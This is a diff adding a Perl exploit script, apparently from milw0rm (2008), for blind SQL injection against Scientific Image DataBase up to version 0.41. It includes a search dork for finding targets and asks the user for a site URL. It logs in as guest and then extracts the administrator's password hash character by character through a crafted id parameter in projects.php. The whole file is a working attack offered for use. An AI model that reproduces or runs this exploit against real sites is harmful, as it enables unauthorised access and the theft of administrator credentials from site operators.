@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+
+use strict;
+use warnings;
+use LWP::UserAgent;
+
+# Download: http://sidb.sourceforge.net/
+# Dork: "Scientific Image DataBase"
+# This exploit retrives the admin username/password via blind mysql injection.
+
+
+print <<INFO; # heredocs is ugly.. so is my INFO ;)
+-------------------------------------
+- Scientific Image DataBase <= 0.41 -
+-    Blind SQL Injection Exploit    -
+-                                   -
+- Coded && Discovered By: t0pP8uZz  -
+-    Discovered On: 19 JUNE 2008    -
+-------------------------------------
+-Greetz: muts, perlunderground, h-y -
+-          cipher, milw0rm          -
+-------------------------------------
+
+INFO
+
+print "Enter URL(ie: http://site.com): ";
+    chomp(my $url=<STDIN>);
+
+my ($substr, $done, $chr, $res) = (1, 1, 48, "");
+
+my $ua = LWP::UserAgent->new( agent => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)', cookie_jar => {} );
+$ua->post($url."/login.php", { 'logon' => 'true', 'user' => 'guest', 'pwd' => 'guest', 'submit' => 'Login' } );
+
+while($done) {
+    my $content = $ua->get($url."/projects.php?show=true&id=57%20and%20ascii(substring((select%20pwd%20from%20users%20where%20userid=1),".$substr.",1))=".$chr);
+    	
+    if($content->content =~ /Not meant/ && length($res) == 32) { $done = 0; }
+    elsif($content->content !~ /Not meant/) { $res .= chr($chr); $substr++; $chr = 48; }
+    else { $chr++; }
+}
+print "Username: sysadmin  Password: ".$res."\n";
+exit;
+
+# milw0rm.com [2008-06-21]
